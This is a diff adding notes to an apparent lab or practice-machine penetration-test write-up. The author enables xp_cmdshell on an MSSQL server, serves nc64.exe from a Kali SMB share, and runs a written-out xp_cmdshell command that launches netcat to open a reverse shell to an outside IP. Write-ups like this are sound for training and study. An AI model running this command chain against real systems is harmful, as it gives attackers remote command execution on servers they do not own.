@@ -222,6 +222,26 @@ Enumerated top 200 UDP ports:
 
 #### - Typed "enable_xp_cmdshell" 
 
+![](Pasted%20image%2020221020010406.png)
+
+#### - Typed "enable_xp_cmdshell system info" and found the system architecture to be x64 bit
+
+#### - Typed "xp_cmdshell" and found we were in directory "C:\Windows\system32"
+
+![](Pasted%20image%2020221020010503.png)
+
+#### - I attempted to get a reverse shell using "curl.exe" and "certultil.exe" as I was able to find both within system32 directory but had no luck
+
+#### - I then started an smb share hosting "nc64.exe" file on my kali machine by typing "smbserver.py Share /home/kali/Downloads":
+
+![](Pasted%20image%2020221020010606.png)
+#SMBServer.pyShare
+
+#### - I then started a netcat listener on my kali machine listening on port 3389
+
+#### - I then typed "xp_cmdshell \\[Kali IP]\Share\nc64.exe -e cmd.exe 192.168.49.114 3389" on the mssql target machine and received a reverse shell on the listener:
+
+
 
 
 ---
